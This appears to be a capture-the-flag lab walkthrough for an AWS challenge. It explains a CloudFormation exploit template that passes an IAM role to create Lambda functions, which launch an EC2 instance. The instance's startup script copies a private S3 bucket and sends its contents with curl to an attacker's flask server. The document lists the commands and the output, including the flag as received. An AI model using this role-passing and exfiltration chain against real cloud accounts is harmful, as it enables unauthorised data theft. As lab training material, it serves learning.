# Template configuration explanation:

* **Prerequisites:**
	* This config guide is for Unix-based CLIs only (syntax may vary).
	* Make sure you have AWC CLI installed.	
	
* **line 7**    `"FunctionName": "CreateVulnEC2Func",`
	* A function that will deploy a vulnerable EC2 instance with permissions to access the S3 pain bucket.

* **line 10**    `"Role": "arn:aws:iam::111111111111:role/brian_mcbride",` 
	* Your AWS account ID (required).
	* The role that lambda can use, allowing it to create functions with it.
	
* **line 21**    `"    instance_iam_role = \"arn:aws:iam::111111111111:instance-profile/landon_donovan\"",` 
	* Your aws account id (required).
	* This is the instance-profile that will be assigned to the the vulnerable EC2 instance, it has access perms to the S3 pain bucket, the instance will use it to breach it.
	
* **line 22**    `"    subnet_id = \"subnet-0d642c7d77641df48\"",` 
	* Replace with one of cloudfox VPC subnet ids (required).
	* The subnet of the "cloudfox" VPC in which the vulnerable instance will run
	* You can find subnet ids for the cloudfox VPC by following these steps:
		1.  `aws ec2 describe-vpcs --profile ctf-starting-user | grep cloudfox -A 10 | grep -i vpcid` (to find the cloudfox VPC ID)
		2. `aws ec2 describe-subnets --profile ctf-starting-user --filters "Name=vpc-id,Values=vpc-*yourcloudfoxvpcid*" | grep -i subnetid` (to find all available subnet IDs in the cloudfox VPC)
	
* **line 23**     `"    security_group_id = \"sg-0b0fc22e569bc0022\"",` 
	* replace with the security group ID related to the subnet above (required).
	* the security group that the vulnerable instance will use, it is needed because it allows full outbound access to the instance, therefore it will be able to send the the flag over to the flask server.
	* You can find the security group available in the VPC by typing this:
		* `aws ec2 describe-security-groups --profile ctf-starting-user --filters "Name=vpc-id,Values=vpc-*yourcloudfoxvpcid*" | grep -i securitygroup | sed 's/^.sg/sg/'` (remove the sed command if you get an error).

* **line 27**     `"            ImageId='ami-0036c16a0c45d97a4',",` 
	* or any AMI image of your choosing, linux/unix based (optional) this one is Amazon Linux.
	* Further configuration may require more changes if you change the AMI image,
	* This is the image that will be used to spin-up the EC2 instance.
	* The command to list publicly available on the AWS marketplace, free, Unix-based AMI images:
		* `aws ec2 describe-images \`
		    `--owners aws-marketplace \`
		    `--filters "Name=is-public,Values=true" \`
            `"Name=platform-details,Values=Linux/UNIX" \`
            `"Name=state,Values=available" \`
		    `--query 'Images[*].[ImageId, Name]' \`
		    `--output table \`
		  `--region us-west-2 \`
		  `--profile ctf-starting-user` (You may have to zoom out to see the output clearly).

* **Line 36**     `"            UserData=\"\"\"#!/bin/bash \n",` 
	* The `UserData` var will define a shell script that will be executed upon instance creation.
	* Change the Unix script convention to the one of your like or the one supported on the AMI image you chose - if you changed it.

* **Line 37**     `"yum install aws-cli -q -y \n",` 
	* This will install the AWS CLI if it is not intalled by default on the spun-up image
	* you may have to change the syntax of the command if you changed the AMI image, make sure the modified command does its function, produces little to no output (to prevent different kind of unneeded errors to do with too much output) and says yes to everything (as you can manually interact with the startup script to confirm the installation).

* **Line 38**     `"aws s3 sync s3://pain-s3-cfu08/ /home/ec2-user/ \n",`
	* This will download the contents of the pain S3 bucket to the default user's home directory.
	* Adjust the name of the S3 bucket to much the bucket name in your account.
	* Again if you changed your AMI instance: make sure the default user of the instance has root perms - to prevent the script from failing as you wont be able to login,  make sure to put the download directory to a directory where the user will be allowed to read/write files without denial of access (home directory is a reliable example).

* **Line 39**     `"flag=$(cat /home/ec2-user/*) \n",`
	* This command puts the contents of everything in the directory of where the bucket contents where downloaded - into a variable called `flag`.
	* Adjust the directory name if your changed the AMI image as needed.

* **Line 40**     `"curl -X POST` http://11.111.111.111:8080/ `-d $flag \n",`
	* Your public ip for where you will run your flask server and the port it will be running on, make sure that the port is open to public access or is forwarded to your host in your router settings (otherwise you can setup the flask server in another cloud-based VM using a 3rd party account and configure inbound access there).

* **Line 73**     `"Role": "arn:aws:iam::111111111111:role/brian_mcbride",`
	*  Same modifications a purpose as in line 10.

* **Line 85**     `"    ami_id = \"ami-0036c16a0c45d97a4\"",` 
	* Adjust if you changed your AMI image id, this will be the AMI image ID that the delete function will take as reference as to what instance to delete.

* **Line 88**     `"           {\"Name\": \"image-id\", \"Values\": [\"ami-0036c16a0c45d97a4\"]},",` 
	* Adjust if you changed your AMI image id, these are the filter options for mapping out the running instances matching the AMI image id value argument.

# Exploitation workflow:

1. First using the christian-pulisic role given in the challlenge (with permissions to initialise cloudformation templates) initialise a cloudformation stack from your local .json file containing the defined resources (the exploit) and pass the tab_ramos role (which has permissions to create lambda functions) whilst doing so, a sample command would look like this:
```
	aws cloudformation create-stack \
    --stack-name PainExploitLambdaFormation \
    --template-body file://stackformation_exploit.json \
    --role-arn arn:aws:iam::111111111111:role/tab_ramos \
    --profile chiristian-pulisic	
```

2. After that you should be able to see a successful output. If the output is good, you can check the stack in your cloud formation using a sample command like this:
```
	aws cloudformation list-stacks --profile ctf-starting-user
```

3. You should see something like this to do with your successfully deployed stack:
```
	"StackSummaries": [
	        {
	            "StackId": "arn:aws:cloudformation:us-west-2:111111111111:stack/PainExploitLambdaFormation/e5335730-fb4f-11ef-9f34-0a44bc585375",
	            "StackName": "PainExploitLambdaFormation",
	            "CreationTime": "2025-03-07T12:30:03.879000+00:00",
	            "StackStatus": "CREATE_COMPLETE",
	            "DriftInformation": {
	                "StackDriftStatus": "NOT_CHECKED"
	            }
	        },
```

4. You should also see 2 lambda functions that you configured in the json document (using a command such as: `aws lambda list-functions --profile ctf-starting-user --no-cli-pager | grep -i functionname`):
```
            "FunctionName": "DeleteVulnEC2Func",
            "FunctionName": "producer",
            "FunctionName": "furls1",
            "FunctionName": "executioner",
            "FunctionName": "auth-me",
            "FunctionName": "consumer",
            "FunctionName": "CreateVulnEC2Func",
```

5. Startup the python flask server using `python3 server.py` (after changing the port if needed and testing communication to the server from the outside using your public ip).

6. Invoke CreateVulnEC2Func using any profile (or no profile at all) and provide any output file name where you will be able to see if the function succeeded or not using a command like `aws lambda invoke --function-name CreateVulnEC2Func ./output-create --profile ctf-starting-user`. The response should be successful as well as the output in the file:
```
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```
```
{"statusCode": 200, "body": "EC2 Instance 'i-09503f36204307d45' launched successfully."}
```

7. Listen for the flag in the CLI output of the flask server, after some time you should see a POST request and its contents containing the flag:
```
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.0.144:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 152-436-769
Received Form Data: ImmutableMultiDict([('FLAG{pain::pulisic_is_proud_of_you}', '')])
35.91.130.226 - - [08/Mar/2025 14:39:29] "POST / HTTP/1.1" 200 -
```

8. After that, close the flask server and invoke DeleteVulnEC2Func the same way you executed the create function, provide an output file to see if it has succeeded, if the status code is 200 in the response and the output in the output file looks like the one below - you have successfully completed the challenge.
```
{"statusCode": 200, "body": "Terminated EC2 instance with id: i-06a939ac79a6f6068"}
```